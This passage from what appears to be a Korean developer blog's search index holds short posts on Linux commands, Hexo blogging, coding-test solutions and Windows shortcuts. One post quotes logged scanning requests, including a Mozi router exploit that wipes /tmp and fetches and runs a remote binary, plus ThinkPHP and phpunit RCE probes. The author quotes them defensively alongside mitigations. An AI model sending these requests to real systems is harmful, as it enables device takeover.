백그라운드 프로세스 확인 명령어","text":"1234567891011// 리눅스 백그라운드 프로세스 확인ps// 모든 프로세스ps -e// 모든 프로세스 + 풀 리스트(uid, pid, ...)ps -ef// 'www'를 포함하는 결과만 표시ps -ef|grep www","link":"/2020/12/21/%EB%A6%AC%EB%88%85%EC%8A%A4-%EB%B0%B1%EA%B7%B8%EB%9D%BC%EC%9A%B4%EB%93%9C-%ED%94%84%EB%A1%9C%EC%84%B8%EC%8A%A4-%ED%99%95%EC%9D%B8-%EB%AA%85%EB%A0%B9%EC%96%B4/"},{"title":"리눅스에서 특정 포트를 사용하는 프로세스 확인하기","text":"terminal123lsof -i:8080kill -9 $(lsof -t -i:8080) ps -ef|grep node 이런식으로 node로 실행한 웹서버를 확인했었는데, node로 실행한 많은 앱이 있을때 어떤게 내가 생각하는 앱인지 헷갈릴때가 있다. 이럴때 특정 포트를 사용하는 프로세스를 어떻게 검색할까 하다가 알아보았다. lsofterminal1lsof -i:3000 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEnode 13721 ec2-user 18u IPv6 389226 0t0 TCP *:hbci (LISTEN) 이런식으로 해당 포트를 사용하는 프로세스를 확인할 수 있다. terminal1lsof -t -i:3000 13721 -t옵션을 추가하면 pid만 깔끔하게 얻을 수 있어 kill -9 $(lsof -t -i:3000) 이런식으로 묶어서 사용할 수 있다. 참고 https://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux","link":"/2020/11/03/%EB%A6%AC%EB%88%85%EC%8A%A4%EC%97%90%EC%84%9C-%ED%8A%B9%EC%A0%95-%ED%8F%AC%ED%8A%B8%EB%A5%BC-%EC%82%AC%EC%9A%A9%ED%95%98%EB%8A%94-%ED%94%84%EB%A1%9C%EC%84%B8%EC%8A%A4-%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/"},{"title":"리눅스에서 파일, 폴더 삭제 명령","text":"12345rm -rf {디렉터리명}rm -rf {파일명}rm -rf {파일명} {디렉터리명} {이렇게 계속 나열하기}rm -rf node_modules package-lock.json cli로 삭제할 파일 또는 디렉터리를 하나이상 나열하여 한번에 삭제할 수 있다.","link":"/2020/11/19/%EB%A6%AC%EB%88%85%EC%8A%A4%EC%97%90%EC%84%9C-%ED%8C%8C%EC%9D%BC-%ED%8F%B4%EB%8D%94-%EC%82%AD%EC%A0%9C-%EB%AA%85%EB%A0%B9/"},{"title":"마크다운에서 유튜브 동영상 삽입하기","text":"와우… 1[![미리보기](https://img.youtube.com/vi/J3kUYFFdVc0/0.jpg)](https://www.youtube.com/watch?v=J3kUYFFdVc0) 이렇게 힘들게 섰었는데… 태그 플러그인 전문 용어로 태그 플러그인이라고 한다. 1{% youtube ycg_Cuse0M4 %} 이렇게 간단하게 사용한다 주의! 순수 마크다운이 아니다! hexo 에서 지원하는 기능이다..","link":"/2020/09/17/%EB%A7%88%ED%81%AC%EB%8B%A4%EC%9A%B4%EC%97%90%EC%84%9C-%EC%9C%A0%ED%8A%9C%EB%B8%8C-%EB%8F%99%EC%98%81%EC%83%81-%EC%82%BD%EC%9E%85%ED%95%98%EA%B8%B0/"},{"title":"마크다운에서 이미지 표시하는 법","text":"md1234![](/img/avatar20200926.png)&lt;img src=&quot;&quot; &gt;&lt;!-- 더이상 이거 안써도된다. --&gt; ![]() 이게 훨씬 간편한 것 같다.","link":"/2020/10/13/%EB%A7%88%ED%81%AC%EB%8B%A4%EC%9A%B4%EC%97%90%EC%84%9C-%EC%9D%B4%EB%AF%B8%EC%A7%80-%ED%91%9C%EC%8B%9C%ED%95%98%EB%8A%94-%EB%B2%95/"},{"title":"마크다운에서 코드 표시하는 법","text":"example.js\"링크도 걸 수 있네\"12let message = '로그를 찍는 코드';console.log(message); 정말 쓸일이 많다. 블로그를 한다면.. .md에서 코드 블럭 표시하기","link":"/2020/09/17/%EB%A7%88%ED%81%AC%EB%8B%A4%EC%9A%B4%EC%97%90%EC%84%9C-%EC%BD%94%EB%93%9C-%ED%91%9C%EC%8B%9C%ED%95%98%EB%8A%94-%EB%B2%95/"},{"title":"멋진 깃허브 블로그 시작하기","text":"나도 멋진 깃허브 블로그를 만들어보고 싶었다. (지금 이 블로그!) Hexo 라는 블로그 프레임워크가 있었다. 한글로 된 공식 문서도 있어서 접근하기 좋았다. 나는 카인드패밀리님의 영상을 보고 따라하면서 만들어 보았다. Hexo를 이용하면 멋진 블로그를 뚝딱하고 만들 수 있다. 간단하게 설명하자면, Hexo에서 원하는 테마를 받아와서 글을 쓰고, 내 github.io 저장소와 연결하고 배포하는 거다. 따라하기 먼저 nodejs와 git이 설치되어 있어야 한다. 또, https://chinsun9.github.io/ 와 같은 url을 얻고싶으면 {자기 깃허브 아이디}.github.io이름의 저장소가 있어야한다. 준비되었다면 cmd를 열고 hexo cli를 전역으로 설치한다. 나는 vscode에서 터미널을 열어서 진행했다. vscode가 최고다. 1npm i hexo-cli -g hexo 프로젝트 생성 적당한 빈 디렉터리로 이동한다음에 아래 명령어를 실행한다. 혹시 다른 테마를 적용하길 원하는 사람은 테마 적용방법을 찾아 보기 바란다. 여기선 icarus를 설명한다. 12hexo initnpm i hexo-theme-icarus 다음엔 icarus테마를 위한 config를 생성한다 1hexo config theme icarus 12345678INFO Validating configERROR { err: [Error: EISDIR: illegal operation on a directory, read] { errno: -4068, code: 'EISDIR', syscall: 'read' }} Plugin load failed: %s hexo-theme-icarus 위 같은 오류가 나면 무시하고 다시 명령을 실행한다 1hexo config theme icarus 1234567INFO === Checking package dependencies ===ERROR Package bulma-stylus is not installed.ERROR Package hexo-renderer-inferno is not installed.ERROR Please install the missing dependencies your Hexo site root directory:ERROR npm install --save bulma-stylus@0.8.0 hexo-renderer-inferno@^0.1.3ERROR or:ERROR yarn add bulma-stylus@0.8.0 hexo-renderer-inferno@^0.1.3 그러면 다른 오류메시지가 나온다. 이러이러한 패키지가 필요하다하면 추가로 설치해준다. 1npm install --save bulma-stylus@0.8.0 hexo-renderer-inferno@^0.1.3 현재까지 설치된 패키지 목록 package.json1234567891011121314151617181920{ // ... &quot;hexo&quot;: { &quot;version&quot;: &quot;5.2.0&quot; }, &quot;dependencies&quot;: { &quot;bulma-stylus&quot;: &quot;^0.8.0&quot;, &quot;hexo&quot;: &quot;^5.0.0&quot;, &quot;hexo-generator-archive&quot;: &quot;^1.0.0&quot;, &quot;hexo-generator-category&quot;: &quot;^1.0.0&quot;, &quot;hexo-generator-index&quot;: &quot;^2.0.0&quot;, &quot;hexo-generator-tag&quot;: &quot;^1.0.0&quot;, &quot;hexo-renderer-ejs&quot;: &quot;^1.0.0&quot;, &quot;hexo-renderer-inferno&quot;: &quot;^0.1.3&quot;, &quot;hexo-renderer-marked&quot;: &quot;^3.0.0&quot;, &quot;hexo-renderer-stylus&quot;: &quot;^2.0.0&quot;, &quot;hexo-server&quot;: &quot;^2.0.0&quot;, &quot;hexo-theme-icarus&quot;: &quot;^4.0.1&quot; }} 종속성이 해결되면 다시 실행 1hexo config theme icarus 123456789INFO === Checking package dependencies ===INFO === Checking theme configurations ===WARN None of the following configuration files is found:WARN - C:\\git\\tmp blog\\_config.icarus.ymlWARN - C:\\git\\tmp blog\\node_modules\\hexo-theme-icarus\\_config.ymlINFO Generating theme configuration file...INFO C:\\git\\tmp blog\\_config.icarus.yml created successfully.INFO To skip configuration generation, use &quot;--icarus-dont-generate-config&quot;.INFO === Registering Hexo extensions === 위처럼 메시지가 나오면 성공이다. 이제 최상위 디렉터리에 _config.yml 이라는 파일이 있는데 아래 처럼 수정한다. 블로그가 될 저장소 주소를 적어준다. 12345theme: icarusdeploy: type: git repo: https://github.com/chinsun9/chinsun9.github.io branch: master 여기까지 성공적으로 됬다면 로컬에서 확인해 볼 수 있다. 1hexo server -p 3000 새 포스트를 써보자 1hexo new &quot;타이틀&quot; log1234INFO === Checking package dependencies ===INFO === Checking theme configurations ===INFO === Registering Hexo extensions ===INFO Created: C:\\git\\2020-github-pages-hexo\\source\\_posts\\new-post20200916.md 위와같은 메시지가 나오는데 vscode터미널같은 경우 ctrl+click을 통해 바로 저 파일을 열어 볼 수 있다. 열어서 열심히 md 언어로 포스팅을 하고 저장한다. 이제 배포를 해보겠다. hexo-deployer-git을 설치한다. 12npm i hexo-deployer-git -g` 그러면 다음 명령어를 사용할 수 있다 12hexo generatehexo deploy 위처럼 명령어를 두번쓰기 귀찮아서 명령어 하나로 묶어 버렸다. 하는 김에 hexo 커밋까지.. package.json1234567891011{ // ... &quot;scripts&quot;: { &quot;build&quot;: &quot;hexo generate&quot;, &quot;clean&quot;: &quot;hexo clean&quot;, &quot;deploy&quot;: &quot;hexo deploy&quot;, &quot;test&quot;: &quot;hexo server&quot;, &quot;start&quot;: &quot;hexo generate &amp; hexo deploy &amp; git add . &amp; git commit -m &quot; } // ...} 글을 하나 쓰고 나면 npm start 명령어로 배포하고 커밋한다.npm start &quot;커밋메시지&quot; 이런식으로 써서 편하게? 관리하려고 했다.","link":"/2020/09/16/%EB%A9%8B%EC%A7%84-%EA%B9%83%ED%97%88%EB%B8%8C-%EB%B8%94%EB%A1%9C%EA%B7%B8-%EC%8B%9C%EC%9E%91%ED%95%98%EA%B8%B0/"},{"title":"모의고사","text":"모의고사12345678910111213141516171819202122// https://programmers.co.kr/learn/courses/30/lessons/42840function solution(answers) { const a = [1, 2, 3, 4, 5]; const b = [2, 1, 2, 3, 2, 4, 2, 5]; const c = [3, 3, 1, 1, 2, 2, 4, 4, 5, 5]; let count = [0, 0, 0]; answers.forEach((element, index) =&gt; { a[index % a.length] == element ? count[0]++ : null; b[index % b.length] == element ? count[1]++ : null; c[index % c.length] == element ? count[2]++ : null; }); let result = []; let max = Math.max.apply(null, count); count.forEach((item, idx) =&gt; { if (max == item) { result.push(idx + 1); } }); return result;}solution([1, 2, 3, 4, 5]); 해설 입력으로 정답 배열이 들어온다. a,b,c 세 사람이 있다. 사람마다 찍기 타입이 있다. 각자 자신만의 패턴으로 문제를 찍었을때 가장 문제를 많이 맞힌 사람을 반환한다 일단 찍기타입을 정의하고, 각 사람마다 정답이면 카운트를 늘린다! 나머지 연산으로 패턴을 지속한다. c[index % c.length] 그 중에서 가장 많이 맞춘 사람 배열을 반환한다. (1~다수)","link":"/2020/09/18/%EB%AA%A8%EC%9D%98%EA%B3%A0%EC%82%AC/"},{"title":"무작위 스캔 공격?","text":"24시간 express로 웹앱을 켜놓은 적이 있다. log를 보니까 이상한 경로의 요청이 많이 있었다. 스캔 로그 특징 무료 도메인과 ELB를 연결해둬서 도메인을 통한 접속과, ec2 ip를 통합 접속을 구분 할 수 있었다. 확인 결과 두곳 모두 이상한 요청이 왔다. 도메인, ELB를 통한 스캔이 많았다. get, post 요청으로 온다. 여러 아이피로 스캔을 한다 스캔 경로12345678910111213141516171819202122232425262728293031323334353637383940&quot;GET /.env HTTP/1.1&quot;&quot;GET /0bef HTTP/1.1&quot;&quot;GET /TP/html/public/index.php HTTP/1.1&quot;&quot;GET /TP/index.php HTTP/1.1&quot;&quot;GET /TP/public/index.php HTTP/1.1&quot;&quot;GET /ab2g HTTP/1.1&quot;&quot;GET /ab2h HTTP/1.1&quot;&quot;GET /boaform/admin/formLogin?username=admin&amp;psd=admin HTTP/1.1&quot;&quot;GET /boaform/admin/formLogin?username=ec8&amp;psd=ec8 HTTP/1.0&quot;&quot;GET /conf.js HTTP/1.1&quot;&quot;GET /config/getuser?index=0 HTTP/1.1&quot;&quot;GET /console/ HTTP/1.1&quot;&quot;GET /currentsetting.htm HTTP/1.1&quot;&quot;GET /elrekt.php HTTP/1.1&quot;&quot;GET /html/public/index.php HTTP/1.1&quot;&quot;GET /index.php HTTP/1.1&quot;&quot;GET /index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=HelloThinkPHP21 HTTP/1.1&quot;&quot;GET /latest/meta-data/ HTTP/1.1&quot;&quot;GET /manager/html HTTP/1.1&quot;&quot;GET /manager/text/list HTTP/1.1&quot;&quot;GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1&quot;&quot;GET /phpMyAdmin/scripts/setup.php HTTP/1.1&quot;&quot;GET /portal/redlion HTTP/1.1&quot;&quot;GET /public/index.php HTTP/1.1&quot;&quot;GET /setup.cgi?next_file=netgear.cfg&amp;todo=syscmd&amp;cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&amp;curpath=/&amp;currentsetting.htm=1 HTTP/1.1&quot;&quot;GET /solr/ HTTP/1.1&quot;&quot;GET /solr/admin/info/system?wt=json HTTP/1.1&quot;&quot;GET /thinkphp/html/public/index.php HTTP/1.1&quot;&quot;GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1&quot;&quot;GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1&quot;&quot;GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1&quot;&quot;GET /wp-login.php HTTP/1.1&quot;&quot;POST / HTTP/1.1&quot;&quot;POST /GponForm/diag_Form?images/ HTTP/1.1&quot;&quot;POST /HNAP1/ HTTP/1.1&quot;&quot;POST /api/jsonws/invoke HTTP/1.1&quot;&quot;POST /mifs/.;/services/LogService HTTP/1.1&quot;&quot;POST /tools.cgi HTTP/1.1&quot;&quot;POST /users?page=&amp;size=5 HTTP/1.1&quot;&quot;POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1&quot; 내 행동 디렉터리 구조가 노출될까봐 error.ejs 정적으로 바꾸기. 에러 스택을 보이지 않게 했다. 웹앱 포트 변경. 잘알려진 8080포트로 웹을 열었더니 스캔공격을 받는 것 같다. 잘알려지지 않은 포트를 사용해서 웹을 열기로 했다. -&gt; EC2 ip를 통한 스캔 방지 에러 로그에만 집중하기 morgan 로깅 내용을 커스텀하고, 400번대 이상의 코드만 로깅하도록 하였다. 동적으로 ACL에 추가해 L4 수준에서 차단 ACL규칙을 최대 18개 정도 사용할 수 있기때문에 돌려막기식이 되어버렸다.. 그래도 꺼림칙한 로그들을 줄일 수 있었다.","link":"/2020/11/10/%EB%AC%B4%EC%9E%91%EC%9C%84-%EC%8A%A4%EC%BA%94%EA%B3%B5%EA%B2%A9/"},{"title":"바로 직전 커밋 취소","text":"12345git reset --soft &quot;HEAD^&quot;또는git reset --soft HEAD~1 이렇게하면 파일 상태는 그대로 이며 직전 커밋내역만 없어진다. 나는 빠진 파일을 추가하거나 커밋 메시지를 다시 작성할 때 쓴다. more? git reset asks ‘more?’ more? 이라는 문구가 나와서 당황했는데 “ “으로 감싸주면된다.","link":"/2020/10/18/%EB%B0%94%EB%A1%9C-%EC%A7%81%EC%A0%84-%EC%BB%A4%EB%B0%8B-%EC%B7%A8%EC%86%8C/"},{"title":"블로그 썸네일 바꾸기","text":"흠… 내 블로그 링크를 걸었는데 이상한 로고가 나온다! \\public\\img\\og_image.png 위치에 있는 이미지를 바꾸면 됩니다. 이 사이트를 대표하는 이미지를 og:image라고 하는 것도 알게 되었다. https://www.opengraph.xyz/ 이 사이트에 자기 블로그 주소를 입력하면 og image가 잘 갱신되었는지 확인 할 수 있다! 카톡 같은 메신저에 다시 내 블로그 링크를 걸어도, 이전 이미지가 나올 수 있는데, 그것은 캐시 때문이다. (언제 갱신될지 잘 모르지만 언젠간 갱신되겠지,.) 아무 이미지도 안나올 때…_config.yml123456789101112title: 친성의 블로그subtitle: &quot;최고의&quot;description: &quot;친성의 개발 블로그&quot;keywords: - dev - developer - coding - swauthor: chinsunglanguage: kotimezone: &quot;Asia/Seoul&quot;url: &quot;https://chinsun9.github.io/&quot; url에 자신의 블로그 주소를 넣습니다. _config.yml1url: &quot;https://chinsun9.github.io/&quot;","link":"/2020/09/17/%EB%B8%94%EB%A1%9C%EA%B7%B8-%EC%8D%B8%EB%84%A4%EC%9D%BC-%EB%B0%94%EA%BE%B8%EA%B8%B0/"},{"title":"블로그 이미지 업데이트","text":"favicon logo avatar","link":"/2020/09/28/%EB%B8%94%EB%A1%9C%EA%B7%B8-%EC%9D%B4%EB%AF%B8%EC%A7%80-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8/"},{"title":"블로그 테마 업데이트","text":"배경색을 흰색으로 바꾸고, 깔끔하게 바꿔보았다.","link":"/2021/02/20/%EB%B8%94%EB%A1%9C%EA%B7%B8-%ED%85%8C%EB%A7%88-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8/"},{"title":"소수 찾기","text":"소수 찾기123456789101112131415161718192021222324252627282930// https://programmers.co.kr/learn/courses/30/lessons/12921function solution(n) { var answer = 0; let sosu = []; let arr = {}; for (let i = 2; i &lt;= n; i++) { arr[i] = 1; } for (let index = 2; index &lt;= n; index++) { const element = arr[index]; if (element == 0) { console.log('index', index); continue; } sosu.push(index); let a = 2; // 지금 현재 값을 while (true) { if (!(arr[index * a] + 1)) { break; } arr[index * a++] = 0; console.log(index * a); } } console.log('소수:', sosu); return sosu.length;}result = solution(10); 효율성 통과하기 어려웠다.. 해설 정수 n을 입력받으면 1부터 n 사이의 소수의 개수를 반환한다 효율성을 통과할려면 에라토스테네스의 체를 써야한다. 에라토스테네스의 체 알고리즘을 구현한다. 글로 적힌거 봣는데 하나도 이해가 안되서, 위 그림을 보고 구현했다. (역시 그림이 최고!) 첫번째 반복문에서 2부터 n까지 1로 초기화한다 이제 2부터 n까지 반복문을 돈다 처음에 2는 소수다. 소수 배열에 추가하고 while루프에서 arr배열에서 2의 2배수를 전부 지운다. 여기서 지운다는 것은 arr[2의배수] = 0 으로 만드는 것! 그러면 다음 루프 3… 똑같이한다 그다음 4에서 arr[4] == 0 이기때문에 바로 패스한다. … 반복 내 글로된 설명보다 그림보는게 훨씬 이해에 빠를것이다! 에라토스테네스의 체 소수를 찾는 방법","link":"/2020/09/18/%EC%86%8C%EC%88%98-%EC%B0%BE%EA%B8%B0/"},{"title":"심볼릭 링크 만들기","text":"동기화 하고 싶은 폴더가 있을때 정말 좋다. 심볼릭 링크 만드는 법 mklink /d [링크이름] [실제위치] 링크이름 ; 새로만들어질 폴더 ; 현재 존재하지 않는 폴더여야 함. 실제위치 ; 원본 폴더 ; 이미 만들어져 있는 폴더 심볼릭 링크 폴더 내용물이 공유된다. (사본이 아님) 링크 폴더도 실제 폴더 처럼 작동한다. 바로가기 아이콘을 하고 있다. 원본 폴더에 별명을 지어준 느낌이다. 포인터 같은 느낌이다. 팁 권한이 없다고 하면 관리자 권한으로 명령을 실행한다. 상대경로를 사용해 만든경우 당연한 말이지만 원본 폴더나 링크 폴더의 위치가 바뀌면 안된다. 디렉터리 구조가 변하지 않고 두 폴더를 이동한다면 잘 작동한다. 절대경로를 사용해 만든경우 링크 폴더를 아무렇게나 이동시켜도 잘 작동한다. 당연한 말이지만 원본 폴더를 옮기면 작동하지 않는다. 내가 활용한 곳aws lambda layer lambda 에서는 함수의 크기를 줄이기 위해 layer라는 것을 사용한다. sam project에서 lambda를 작성하고 node_modules 같은 무거운 얘들은 layer로 빼야한다. 그런데 이 과정이 매우 귀찮다. package.json 에서 종속성들이 빌드되지 않게 주석 sam yaml에서 지정한 종속성 경로에 node_modules 사본 또는 옮기기 수정작업할때, 코딩할때 자동완성 및 문서를 보기 위해서는 node_modules 폴더가 함수 안에 필요함. sam yaml에서 지정한 종속성 경로는 함수안이 되면 안됨. 즉, 직접 다이렉트로 node_modules를 지정할 수 없음. sam project 루트로 빼던가 해야함. 여기서 심볼릭 링크를 활용해서 두 폴더간 동기화를 진행!","link":"/2020/09/17/%EC%8B%AC%EB%B3%BC%EB%A6%AD-%EB%A7%81%ED%81%AC-%EB%A7%8C%EB%93%A4%EA%B8%B0/"},{"title":"약수의 합","text":"1234567891011121314151617181920212223// https://programmers.co.kr/learn/courses/30/lessons/12928function solution(n) { if (n == 0 || n == 1) { return n; let arr = [1, n]; console.log(Math.sqrt(n)); for (let index = 2; index &lt;= Math.sqrt(n); index++) { if (n % index == 0) { arr.push(index); if (index == Math.sqrt(n)) { } else { arr.push(n / index); } } } console.log(arr); return arr.reduce((prev, curr) =&gt; { console.log(prev, curr); return curr + prev; }, 0);}result = solution(12); //28 해설 정수를 입력받으면 모든 약수의 합을 반환한다 0, 1인 경우 바로 반환한다 무조건 약수인 1과 자기자신으로 약수가 저장될 배열을 초기화한다 2부터 n의 제곱근까지 반복문을 돌면서 나누어 떨어지는지 판단한다 나누어 떨어지면 약수 배열에 추가한다. 약수는 항상 세트로 존재하기 때문에, 제곱근의 경우가 아니라면 n / index 도 약수로 추가한다. reduce로 약수배열의 합을 구한다.","link":"/2020/09/18/%EC%95%BD%EC%88%98%EC%9D%98-%ED%95%A9/"},{"title":"여러 컴퓨터에서 hexo 블로깅하기","text":"{username}.github.iohexo repo hexo 블로그를 운영한다면 이렇게 2가지 저장소가 있을 것이다. hexo repo를 깃허브에 올리고, 다른 컴퓨터에서 클론해서 받아온다. 그리고 hexo 디렉터리안에 .deploy_git 디렉터리를 만들고 그안에 {username}.github.io 를 클론한다. 상황 블로그를 찍어내는 hexo 디렉터리를 깃허브에 올렸다. 다른 컴퓨터에서 hexo 저장소를 클론하고 블로그 배포를 해보았는데, .deploy_git 디렉터리가 아예 새로 생성되면서 chinsun9.github.io 의 커밋 내역이 싹다 날라갔다.. chinsun9.github.io 의 커밋 내역을 유지하면서 여러 컴퓨터에서 블로깅을 할 수 있을까? 해결 .deploy_git 가 있는 내용이 force push 된다. 당연히 새로운 컴퓨터에서는 .deploy_git를 새로생성하기때문에 커밋내역이 싹 날라가게된다. .deploy_git의 내용을 기존의 내용으로 채워주고 hexo generate하면 커밋내역도 유지되면서 변경사항이 적용된다. 그리고 내가 이미지를 public/images 에 저장해 두었는데, 이 디렉터리가 gitignore에 설정 되어 있어서 이미지가 하나도 깃허브에 올라가지 않았었다. 그것도 모르고 클론하고 배포를 해버렸다. 그래서 다시 원래 작업하는 컴퓨터에서 배포하여 원상복구 시켰다. .gitignore도 여러컴퓨터에서 작업할 때 적절히 설정해야한다. 참고 hexojs/hexo-deployer-git","link":"/2020/09/18/%EC%97%AC%EB%9F%AC-%EC%BB%B4%ED%93%A8%ED%84%B0%EC%97%90%EC%84%9C-%EB%B8%94%EB%A1%9C%EA%B9%85%ED%95%98%EA%B8%B0/"},{"title":"예쁜 그라디언트","text":"Fresh Background Gradients | WebGradients.com 💎 예쁜 그라디언트 복붙해 오는 곳 png 이미지 또는 css 쉽게 가져올 수 있다 12345678.gradient { background-image: linear-gradient( 45deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100% );}","link":"/2020/12/04/%EC%98%88%EC%81%9C-%EA%B7%B8%EB%9D%BC%EB%94%94%EC%96%B8%ED%8A%B8/"},{"title":"예산","text":"예산1234567891011121314151617181920// https://programmers.co.kr/learn/courses/30/lessons/12982function solution(d, budget) { let answer = 0; d = d.sort((a, b) =&gt; a - b); console.log(d); let count; for (count = 0; count &lt; d.length; count++) { const element = d[count]; budget -= element; if (budget &lt; 0) { break; } else if (budget == 0) { count++; break; } } answer = count; return answer;}result = solution([1, 3, 2, 5, 4], 9); 해설 각 부서의 요구 금액 배열과 예산이 인풋으로 들어온다. 최대한 많은 부서에게 지원하는 경우, 그 부서의 개수를 구해 리턴한다. 먼저 배열을 오름차순으로 정렬한다 배열 앞에서 부터 하나씩 지원해주면서 예산을 깐다. 카운트++ 한다 그러다가 예산이 요구하느 금액보다 작아 지원을 못해주는 경우 break한다. 현재까지 count를 반환한다.","link":"/2020/09/18/%EC%98%88%EC%82%B0/"},{"title":"완주하지 못한 선수","text":"완주하지 못한 선수12345678910111213// https://programmers.co.kr/learn/courses/30/lessons/42576const solution = (participant, completion) =&gt; { let objComletion = {}; completion.forEach((item) =&gt; { !objComletion[item] ? (objComletion[item] = 1) : objComletion[item]++; }); for (let i = 0; i &lt; participant.length; i++) if (!objComletion[participant[i]] || --objComletion[participant[i]] &lt; 0) return participant[i];};result = solution(['leo', 'kiki', 'eden'], ['eden', 'kiki']); 효율성때문에 골치 아픈 문제 해설 solution(['leo', 'kiki', 'eden'], ['eden', 'kiki']) 이런식으로 이름이 들어간 2개의 배열이 들어온다. 첫번째 배열은 참가자명단이고 두번째 배열은 완주자명단이다 완주하지 못한 사람을 반환하면 된다. 그런데 동명이인이 있을 수 있다. 중첩 반복문으로 풀다가 효율성에서 실패했다. 해쉬를 써서 풀라는데, 그러다 생각한데 객체를 만들어서 접근하는 방식이다.. objComletion라는 객체를 하나 생성하고 반복분으로 objComletion.사람이름 으로 초기화한다. 초기화할때 멤버가 없으면 1로 초기화하고 이미 존재하면 ++해서 동명이인 처리를 했다. participant(참가자) 배열로 반목문을 돌면서 사람이름으로 다이렉트로 접근하니까 효율성이 엄청 좋아졌다. 멤버가 없거나, 0일경우 완주하지 못한 선수를 잡아낼 수 있다. 잡담 이 문제 풀면서 겉멋 코드에 맛들려서 안쓰던 화살표 함수도 쓰고… 변수명 &amp;, _ 이런거도 써봤다..ㅋㅋ 효율성 획기적으로 줄여서 기분이 좋았다.","link":"/2020/09/18/%EC%99%84%EC%A3%BC%ED%95%98%EC%A7%80-%EB%AA%BB%ED%95%9C-%EC%84%A0%EC%88%98/"},{"title":"윈도우10에서 선택영역 캡처하기","text":"더이상 print screen key 그림판 ctrl v, crop, ctrl c, ctrl v 할 필요가없다. Win + Shift + S 단축키를 누르면 중앙 상단에 ui가 나오면서 드래그로 원하는 영역을 캡처할 수 있다. 스크린샷은 클립보드에 저장되면 원하는 곳에 붙여넣어 사용할 수 있다. 다른 캡쳐 단축키Alt + PrintScreen 현재 활성화된창을 캡처한다. 이것도 많이 쓴다. PrintScreen 전체화면 캡처","link":"/2020/10/06/%EC%9C%88%EB%8F%84%EC%9A%B010%EC%97%90%EC%84%9C-%EC%84%A0%ED%83%9D%EC%98%81%EC%97%AD-%EC%BA%A1%EC%B2%98%ED%95%98%EA%B8%B0/"},{"title":"윈도우10에서 클립보드 사용하기","text":"복사를 여러개 해둘 수 있다. 꿀 단축키 Win + V Win + V 키를 누르면 클립보드 창이 나온다. 아마 이 기능을 처음 사용한다면, 클립보드를 시작할 것인지 물어보는데 버튼을 눌러 시작할 수 있다. Ctrl + C 나 Print Screen키를 누를때마다 클립보드에 새로이 추가된다.","link":"/2020/10/06/%EC%9C%88%EB%8F%84%EC%9A%B010%EC%97%90%EC%84%9C-%ED%81%B4%EB%A6%BD%EB%B3%B4%EB%93%9C-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"유용한 탐색기 explorer 단축키","text":"클릭 클릭해서 바꿨었는데, 이제는 단축키로.! 탐색기를 돌아다니다보면 보기옵션이 이상해서 보기힘들다. Ctrl + Shift + [12345678] 나는 주로 ctrl shift 6 인 자세히 옵션을 주로 이용한다. 1~8까지 옵션이 있다.","link":"/2020/10/21/%EC%9C%A0%EC%9A%A9%ED%95%9C-%ED%83%90%EC%83%89%EA%B8%B0-explorer-%EB%8B%A8%EC%B6%95%ED%82%A4/"},{"title":"일렉트론으로 OBS input overlay 클론코딩","text":"오버워치 강의 영상을 보다가 영상 속 키보드 마우스 뷰어? 를 가끔 보았었다. 일단 깔끔한 키보드 뷰어로 흥미가 생겼었는데 찾아보니까 OBS input overlay라는 OBS 전용 플러그인이었다. 일렉트론이라는 프레임워크를 사용하여 html, css, js로 데스크탑 앱으로 만들어보았다. 신경 쓴 것글로벌 키 훅? 내가 만든 앱 밖에서 키가 눌리고 떼지는 걸 알아야 한다. index.js12345const ioHook = require('iohook');ioHook.on('keydown', (event) =&gt; { mainWindow.webContents.send('keydown', event.rawcode);}); iohook 패키지를 사용해서 해결하게 되었다. 그런데 iohook이 최신 버전의 일렉트론에서 실행이 안되어서 일렉트론 8.x버전으로 낮추어 진행하게 되었다. overlay window 오버레이 화면에 마우스 클릭이 되지 않도록 했다. 오버레이 화면이 프레임을 가지지 않도록 했다 오버레이 화면이 모니터 크기를 구하여 우측 하단에 생기도록 하였다. (여러 해상도 대응) 일렉트론 웹 기술로 데스크탑앱을 만들 수 있게해주는 마법이다. 나는 요즘 js만 해왔기 때문에 일렉트론에 대해 찾아보았다. 일렉트론으로 만들어진 대표적인 앱으로는 비주얼 스튜디오 코드가 있다. 일렉트론 시작 Create Desktop App + Installer with HTML/CSS/JS - Electron Tutorial 2020 유튜브를 보며 시작했다 create-electron-app 를 통해 express-generator 처럼 빠르게 프로젝트를 시작할 수 있다. (보일러플레이트) electron-builder 를 통해 배포용 setup 파일을 생성할 수 있다. 소스코드 ; https://github.com/chinsun9/electron-practice 일렉트론 단점? 엄청나게 간단한 앱일지라도 nodejs + Chromium 조합으로 용량이 상당히크다. 소스코드 Input Overlay (Electron)","link":"/2020/11/05/%EC%9D%BC%EB%A0%89%ED%8A%B8%EB%A1%A0%EC%9C%BC%EB%A1%9C-OBS-input-overlay-%ED%81%B4%EB%A1%A0%EC%BD%94%EB%94%A9/"},{"title":"자릿수 더하기","text":"자릿수 더하기1234567891011// https://programmers.co.kr/learn/courses/30/lessons/12931function solution(n) { let answer; n = `${n}`; n = n.split(''); answer = n.reduce((prev, curr) =&gt; { return parseInt(curr) + parseInt(prev); }, 0); return answer;}result = solution(123); 해설 각 자릿수를 더해서 반환한다 reduce로 각 자릿수의 합을 구한다.","link":"/2020/09/18/%EC%9E%90%EB%A6%BF%EC%88%98-%EB%8D%94%ED%95%98%EA%B8%B0/"},{"title":"자연수 뒤집어 배열로 만들기","text":"자연수 뒤집어 배열로 만들기12345678// https://programmers.co.kr/learn/courses/30/lessons/12932function solution(n) { var answer = []; answer = `${n}`.split('').map(Number); answer.reverse(); return answer;}result = solution(12345); 해설 입력으로 정수가 들어오면 